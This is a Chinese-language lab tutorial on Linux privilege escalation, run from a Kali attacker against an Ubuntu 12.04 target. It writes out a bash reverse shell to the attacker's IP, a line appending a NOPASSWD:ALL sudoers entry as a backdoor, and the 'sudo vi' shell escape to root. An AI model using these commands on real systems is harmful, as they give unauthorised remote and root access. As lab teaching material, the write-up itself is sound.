### 修改 /etc/sudoers 文件 + vi 指令提权

环境准备：一台 KaliLinux（攻击者）和一台 Ubuntu 12.04.5（靶标）

![](https://pic1.imgdb.cn/item/68bf548958cb8da5c88af39e.png)

![](https://pic1.imgdb.cn/item/68bf54b358cb8da5c88af3bc.png)

在靶标上手动创建反弹 Shell 模拟已进入内网情况

```sh
bash -i >& /dev/tcp/192.168.41.151/6767 0>&1
```

![](https://pic1.imgdb.cn/item/68bf558958cb8da5c88af412.png)

```sh
sudo cat /etc/sudoers
```

`/etc/sudoers`：sudo 的配置文件，定义谁可以用 sudo 做什么、以及一系列 Defaults 选项（环境、日志、安全策略等

![](https://pic1.imgdb.cn/item/68c6dcb3c5157e1a8801ab32.png)

案例

```sh
Defaults        env_reset, mail_badpass, secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
root            ALL=(ALL:ALL) ALL                # root: 完全权限
%sudo           ALL=(ALL:ALL) ALL                # sudo 组：完全权限
alice           ALL=(ALL) NOPASSWD: /usr/bin/apt-get  # alice：无需密码可运行 apt-get
#includedir /etc/sudoers.d
```

我们通过给用户添加无需密码并全部改成 ALL 来提权

```
echo 'supermanqiang ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
```

![](https://pic1.imgdb.cn/item/68c6fbbbc5157e1a8801eaf1.png)

查看权限

```sh
sudo -l
```

`-l`（list）：列出用户可以通过 sudo 执行的命令列表

![](https://pic1.imgdb.cn/item/68c6fca4c5157e1a8801eba6.png)

这时候我们再利用 `vi` 命令提权

```sh
sudo vi -c ':!/bin/sh' /dev/null
```

1️⃣ 命令结构

- `sudo`：以 root 权限执行后面的命令
- `vi`：Linux 下的文本编辑器（Vim 的基础版本）
- `-c ':!/bin/sh'`：启动 `vi` 后执行一个命令，命令是 `:! /bin/sh`
  - `:` 表示 vi 的命令模式
  - `!` 表示执行 shell 命令
  - `/bin/sh` 启动一个 shell
- `/dev/null`：打开一个空设备文件，相当于没有实际编辑的文件

2️⃣ 执行流程

1. `sudo` 提升权限，执行 `vi`
2. `vi` 启动时立即执行 `:!/bin/sh`，也就是 **启动一个 shell**
3. 因为 `sudo` 在前面，这个 shell **是 root 权限的**
4. 打开的是 `/dev/null`，所以不会编辑任何真实文件，避免改动系统文件

![](https://pic1.imgdb.cn/item/68c701ecc5157e1a88020230.png)
